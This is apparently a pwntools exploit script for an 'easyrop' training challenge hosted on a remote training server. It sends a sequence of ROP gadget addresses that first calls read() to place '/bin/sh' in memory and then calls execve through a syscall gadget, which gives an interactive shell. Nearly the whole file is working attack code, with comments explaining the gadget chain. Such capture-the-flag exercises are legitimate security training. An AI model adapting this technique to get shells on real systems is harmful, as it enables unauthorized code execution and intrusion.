from pwn import *
import time
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./easyrop")
r = remote("bin.training.jinblack.it", 2015)

'''
gdb.attach(r, """
	b* 0x4001c2	
	c
""")
'''

payload = b"A" * 4
timee = 0.1
for i in range(1,15):
	r.send(payload)
	time.sleep(timee)
	r.send(payload)
	time.sleep(timee)

# the idea is to use a gadget to fill the 4 registers for the read. Notice that to use the read we need also another gadget 
# with a syscall. With the read we insert /bin/sh and then we use again the first gadget (rax = 0x3b) and again the second one
# to call execve this time

pop_rdi_rsi_rdx_rax = p32(0x4001c2)
r.send(p32(0))
time.sleep(timee)
r.send(pop_rdi_rsi_rdx_rax)
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rdi <- 0
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rsi <- address of variable len at 0x600370
len_addr = p32(0x600370) # 0x4002aa
r.send(p32(0))
time.sleep(timee)
r.send(len_addr)
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rdx <- 8 (8 bytes)
r.send(p32(0))
time.sleep(timee)
r.send(p32(16))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rax <- 0 (8 bytes)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# second gadget
syscall = p32(0x4001b3)
r.send(p32(0))
time.sleep(timee)
r.send(syscall)
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# the next lines are there just because i am afraid that the "void" inputs
# to exit from the loop will break the second gadget
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

bin_string = b"/bin/sh"

# sending the first gadget followed by the arguments that we want in the registers
# $ ROPgadget --binary ./easyrop	to check the binary
pop_rdi_rsi_rdx_rax = p32(0x4001c2)
r.send(p32(0))
time.sleep(timee)
r.send(pop_rdi_rsi_rdx_rax)
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# arguments of the first gadget

# rdi <- pointer to "/bin/sh\x00"
r.send(p32(0))
time.sleep(timee)
r.send(len_addr)
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rsi <- 0 (8 bytes)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rdx <- 0 (8 bytes)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# rax <- 0x3b (8 bytes)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0x3b))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)


# second gadget
syscall = p32(0x4001b3) 
r.send(p32(0))
time.sleep(timee)
r.send(syscall)

time.sleep(timee)
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)


# the next line are there just because i am afraid that the "void" inputs
# to exit from the loop will break the second gadget
r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

r.send(p32(0))
time.sleep(timee)
r.send(p32(0))
time.sleep(timee)

# exit from the loop
r.send("\n")
time.sleep(1)
r.send("\n")
time.sleep(1)

r.send(bin_string)
time.sleep(timee)

r.interactive()

input("wait")

